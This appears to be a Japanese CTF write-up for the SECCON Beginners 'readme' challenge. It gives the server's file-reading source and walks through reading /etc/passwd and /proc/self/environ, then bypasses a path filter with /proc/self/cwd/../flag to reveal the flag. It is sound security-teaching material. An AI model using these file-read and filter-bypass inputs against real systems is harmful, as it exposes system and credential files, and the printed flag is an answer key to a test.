# readme:Misc:272pts
[readme](readme.zip-58261436215c147c3ab23cdaae6a5efd82a3ccbf)  
nc readme.quals.beginners.seccon.jp 9712  

# Solution
解凍すると以下のソースコードserver.pyが出てくる。  
```python:server.py
#!/usr/bin/env python3
import os

assert os.path.isfile('/home/ctf/flag') # readme

if __name__ == '__main__':
    path = input("File: ")
    if not os.path.exists(path):
        exit("[-] File not found")
    if not os.path.isfile(path):
        exit("[-] Not a file")
    if '/' != path[0]:
        exit("[-] Use absolute path")
    if 'ctf' in path:
        exit("[-] Path not allowed")
    try:
        print(open(path, 'r').read())
    except:
        exit("[-] Permission denied")
```
ncを行うと、どうやらファイルを読み込んでくれるらしい。  
ただし、/から始まりctfを使わないことが条件である。  
/etc/passwdを見てみる。  
```bash
$ nc readme.quals.beginners.seccon.jp 9712
File: /etc/passwd
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
~~~
ctf:x:1000:1000:Linux User,,,:/home/ctf:/bin/ash
```
表示されたので、なんとか迂回してctfユーザのホームディレクトリにたどり着きたい。  
/proc/self/environを見てみる。  
ここで自プロセスの環境変数を見ることができる。  
```bash
$ nc readme.quals.beginners.seccon.jp 9712
File: /proc/self/environ
HOSTNAME=b2a8444bdc32 PYTHON_PIP_VERSION=20.1 SHLVL=1 HOME=/home/ctf GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 PYTHON_VERSION=3.7.7 PWD=/home/ctf/serve PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348 SOCAT_PID=12637 SOCAT_PPID=1 SOCAT_VERSION=1.7.3.3 SOCAT_SOCKADDR=172.21.0.2 SOCAT_SOCKPORT=9712 SOCAT_PEERADDR=219.126.191.85 SOCAT_PEERPORT=10861
```
PWDが/home/ctf/serveのようだ。  
プロセスのPWDへのシンボリックリンクは/proc/self/cwdである。  
そこから一つ上がればよい。  
```bash
$ nc readme.quals.beginners.seccon.jp 9712
File: /proc/self/cwd/../flag
ctf4b{m4g1c4l_p0w3r_0f_pr0cf5}
```

## ctf4b{m4g1c4l_p0w3r_0f_pr0cf5}